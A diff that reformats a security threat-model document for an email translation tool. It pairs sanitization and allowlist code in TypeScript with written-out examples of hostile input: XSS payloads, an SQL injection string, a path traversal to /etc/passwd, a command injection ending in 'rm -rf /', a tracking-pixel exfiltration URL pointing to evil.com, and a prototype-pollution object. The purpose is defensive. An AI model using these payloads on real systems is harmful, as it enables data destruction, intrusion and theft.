@@ -13,16 +13,16 @@ This tool operates under the following trust model:
 
 ### Attack Surface
 
-| Vector | Risk | Mitigation |
-|--------|------|------------|
-| **XSS via source text** | High | Sanitize HTML, escape special chars before rendering |
-| **XSS via translated output** | High | Sanitize provider responses, treat as untrusted |
-| **Prototype pollution** | Medium | Validate object shapes, avoid dynamic key assignment |
-| **ReDoS (Regular Expression DoS)** | Medium | Use safe regex patterns, timeout long operations |
-| **Data exfiltration** | High | Never send to unapproved endpoints, log provider usage |
-| **Clipboard injection** | Medium | Sanitize before clipboard write, validate clipboard API usage |
-| **Memory exhaustion** | Medium | Enforce size limits on input/output |
-| **Language code injection** | Low | Whitelist valid language codes only |
+| Vector                             | Risk   | Mitigation                                                    |
+| ---------------------------------- | ------ | ------------------------------------------------------------- |
+| **XSS via source text**            | High   | Sanitize HTML, escape special chars before rendering          |
+| **XSS via translated output**      | High   | Sanitize provider responses, treat as untrusted               |
+| **Prototype pollution**            | Medium | Validate object shapes, avoid dynamic key assignment          |
+| **ReDoS (Regular Expression DoS)** | Medium | Use safe regex patterns, timeout long operations              |
+| **Data exfiltration**              | High   | Never send to unapproved endpoints, log provider usage        |
+| **Clipboard injection**            | Medium | Sanitize before clipboard write, validate clipboard API usage |
+| **Memory exhaustion**              | Medium | Enforce size limits on input/output                           |
+| **Language code injection**        | Low    | Whitelist valid language codes only                           |
 
 ---
 
@@ -31,6 +31,7 @@ This tool operates under the following trust model:
 ### 1. Malformed or Hostile Email Bodies
 
 **Examples:**
+
 - HTML/XML with script tags: `<script>alert('xss')</script>`
 - Encoded attacks: `&lt;script&gt;`, `\u003cscript\u003e`
 - Malformed Unicode: broken surrogate pairs, overlong sequences
@@ -39,63 +40,82 @@ This tool operates under the following trust model:
 - Deeply nested HTML: DoS via parser exhaustion
 
 **Handling:**
+
 ```typescript
 // Max size enforcement
 const MAX_TEXT_SIZE = 1_000_000; // 1MB of text
 
 // Sanitization before processing
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 
 function sanitizeEmailBody(raw: string): string {
   if (raw.length > MAX_TEXT_SIZE) {
-    throw new SecurityError('Email body exceeds maximum size');
+    throw new SecurityError("Email body exceeds maximum size");
   }
-  
+
   // Strip HTML entirely (translation should work on plaintext)
-  const plaintext = DOMPurify.sanitize(raw, { 
-    ALLOWED_TAGS: [], 
-    ALLOWED_ATTR: [] 
+  const plaintext = DOMPurify.sanitize(raw, {
+    ALLOWED_TAGS: [],
+    ALLOWED_ATTR: [],
   });
-  
+
   // Remove null bytes and control characters except newlines/tabs
-  return plaintext.replace(/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/g, '');
+  return plaintext.replace(/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/g, "");
 }
 ```
 
 ### 2. Language Code Injection
 
 **Examples:**
+
 - SQL injection attempts: `en'; DROP TABLE--`
 - Path traversal: `../../etc/passwd`
 - Command injection: `en && rm -rf /`
 - Non-standard codes: arbitrary strings instead of ISO codes
 
 **Handling:**
+
 ```typescript
 // Strict whitelist of ISO 639-1 codes
 const VALID_LANGUAGE_CODES = new Set([
-  'en', 'es', 'fr', 'de', 'it', 'pt', 'ru', 'zh', 'ja', 'ko',
-  'ar', 'hi', 'bn', 'pa', 'te', 'mr', 'ta', 'tr', 'vi', 'pl',
+  "en",
+  "es",
+  "fr",
+  "de",
+  "it",
+  "pt",
+  "ru",
+  "zh",
+  "ja",
+  "ko",
+  "ar",
+  "hi",
+  "bn",
+  "pa",
+  "te",
+  "mr",
+  "ta",
+  "tr",
+  "vi",
+  "pl",
   // ... exhaustive list
 ]);
 
 function validateLanguageCode(code: string): boolean {
-  return typeof code === 'string' 
-    && /^[a-z]{2}$/.test(code) 
-    && VALID_LANGUAGE_CODES.has(code);
+  return typeof code === "string" && /^[a-z]{2}$/.test(code) && VALID_LANGUAGE_CODES.has(code);
 }
 
 function sanitizeLanguageCode(code: unknown): string {
-  if (typeof code !== 'string') {
-    throw new ValidationError('Language code must be a string');
+  if (typeof code !== "string") {
+    throw new ValidationError("Language code must be a string");
   }
-  
+
   const normalized = code.toLowerCase().trim().slice(0, 2);
-  
+
   if (!validateLanguageCode(normalized)) {
     throw new ValidationError(`Invalid language code: ${code}`);
   }
-  
+
   return normalized;
 }
 ```
@@ -103,6 +123,7 @@ function sanitizeLanguageCode(code: unknown): string {
 ### 3. Translation Provider Responses
 
 **Examples:**
+
 - XSS in translated text: provider returns `<img src=x onerror=alert(1)>`
 - Encoding attacks: provider returns encoded scripts
 - Excessively large responses: DoS via memory exhaustion
@@ -110,33 +131,34 @@ function sanitizeLanguageCode(code: unknown): string {
 - Injection of tracking pixels: `<img src="https://evil.com/track?data=...">`
 
 **Handling:**
+
 ```typescript
 const MAX_RESPONSE_SIZE = 2_000_000; // 2MB
 
 async function fetchTranslation(
-  text: string, 
-  from: string, 
+  text: string,
+  from: string,
   to: string,
-  provider: TranslationProvider
+  provider: TranslationProvider,
 ): Promise<string> {
   const response = await provider.translate(text, from, to);
-  
+
   // Size check
   if (response.length > MAX_RESPONSE_SIZE) {
-    throw new SecurityError('Translation response exceeds maximum size');
+    throw new SecurityError("Translation response exceeds maximum size");
   }
-  
+
   // Sanitize output (strip HTML, keep plaintext)
   const sanitized = DOMPurify.sanitize(response, {
     ALLOWED_TAGS: [],
-    ALLOWED_ATTR: []
+    ALLOWED_ATTR: [],
   });
-  
+
   // Additional validation
   if (sanitized.length === 0 && response.length > 0) {
-    throw new SecurityError('Translation response contained only unsafe content');
+    throw new SecurityError("Translation response contained only unsafe content");
   }
-  
+
   return sanitized;
 }
 ```
@@ -144,11 +166,13 @@ async function fetchTranslation(
 ### 4. Configuration Injection
 
 **Examples:**
+
 - API key exfiltration: user-provided config sends keys to attacker
 - Endpoint override: user forces translation to malicious server
 - Prototype pollution: `{"__proto__": {"isAdmin": true}}`
 
 **Handling:**
+
 ```typescript
 interface ProviderConfig {
   apiKey: string;
@@ -157,43 +181,43 @@ interface ProviderConfig {
 }
 
 const ALLOWED_ENDPOINTS = new Set([
-  'https://api.openai.com/v1/chat/completions',
-  'https://translation.googleapis.com/language/translate/v2',
+  "https://api.openai.com/v1/chat/completions",
+  "https://translation.googleapis.com/language/translate/v2",
   // ... approved providers only
 ]);
 
 function validateProviderConfig(config: unknown): ProviderConfig {
-  if (typeof config !== 'object' || config === null) {
-    throw new ValidationError('Config must be an object');
+  if (typeof config !== "object" || config === null) {
+    throw new ValidationError("Config must be an object");
   }
-  
+
   // Avoid prototype pollution
   const safe = Object.create(null);
   const raw = config as Record<string, unknown>;
-  
+
   // Validate endpoint
-  if (typeof raw.endpoint !== 'string') {
-    throw new ValidationError('Endpoint must be a string');
+  if (typeof raw.endpoint !== "string") {
+    throw new ValidationError("Endpoint must be a string");
   }
-  
+
   const url = new URL(raw.endpoint); // Throws if invalid
   if (!ALLOWED_ENDPOINTS.has(url.origin + url.pathname)) {
     throw new SecurityError(`Endpoint not in allowlist: ${raw.endpoint}`);
   }
   safe.endpoint = url.toString();
-  
+
   // Validate API key (no validation beyond type - store securely)
-  if (typeof raw.apiKey !== 'string' || raw.apiKey.length < 10) {
-    throw new ValidationError('Invalid API key format');
+  if (typeof raw.apiKey !== "string" || raw.apiKey.length < 10) {
+    throw new ValidationError("Invalid API key format");
   }
   safe.apiKey = raw.apiKey;
-  
+
   // Validate timeout
-  if (typeof raw.timeout !== 'number' || raw.timeout < 1000 || raw.timeout > 60000) {
-    throw new ValidationError('Timeout must be between 1000-60000ms');
+  if (typeof raw.timeout !== "number" || raw.timeout < 1000 || raw.timeout > 60000) {
+    throw new ValidationError("Timeout must be between 1000-60000ms");
   }
   safe.timeout = raw.timeout;
-  
+
   return safe as ProviderConfig;
 }
 ```
@@ -250,12 +274,12 @@ catch (err) {
 
 // ✅ GOOD
 catch (err) {
-  logger.error('Translation failed', { 
-    error: err, 
+  logger.error('Translation failed', {
+    error: err,
     provider: providerName,
     // Log full details server-side only
   });
-  
+
   throw new TranslationError(
     'Translation service unavailable. Please try again.',
     { cause: 'provider_error' }
@@ -265,13 +289,13 @@ catch (err) {
 
 ### Error Categories
 
-| Error Type | User Message | Log Details |
-|------------|--------------|-------------|
-| `ValidationError` | "Invalid input. Please check your text." | Full validation failure reason |
-| `SecurityError` | "Request blocked for safety." | Attack vector, sanitization details |
-| `ProviderError` | "Translation service unavailable." | Provider response, status code |
-| `NetworkError` | "Network error. Check your connection." | Endpoint, timeout, fetch error |
-| `RateLimitError` | "Too many requests. Try again later." | Rate limit metrics, user identifier |
+| Error Type        | User Message                             | Log Details                         |
+| ----------------- | ---------------------------------------- | ----------------------------------- |
+| `ValidationError` | "Invalid input. Please check your text." | Full validation failure reason      |
+| `SecurityError`   | "Request blocked for safety."            | Attack vector, sanitization details |
+| `ProviderError`   | "Translation service unavailable."       | Provider response, status code      |
+| `NetworkError`    | "Network error. Check your connection."  | Endpoint, timeout, fetch error      |
+| `RateLimitError`  | "Too many requests. Try again later."    | Rate limit metrics, user identifier |
 
 ---
 
@@ -282,22 +306,22 @@ All security-relevant operations should be logged (server-side only, not in brow
 ```typescript
 interface SecurityEvent {
   timestamp: string;
-  eventType: 'validation_failure' | 'sanitization' | 'rate_limit' | 'provider_error';
+  eventType: "validation_failure" | "sanitization" | "rate_limit" | "provider_error";
   userId?: string;
   details: Record<string, unknown>;
-  severity: 'low' | 'medium' | 'high';
+  severity: "low" | "medium" | "high";
 }
 
 // Example usage
 logger.securityEvent({
   timestamp: new Date().toISOString(),
-  eventType: 'sanitization',
+  eventType: "sanitization",
   details: {
     originalLength: raw.length,
     sanitizedLength: sanitized.length,
-    strippedTags: ['script', 'iframe'],
+    strippedTags: ["script", "iframe"],
   },
-  severity: 'medium',
+  severity: "medium",
 });
 ```
 
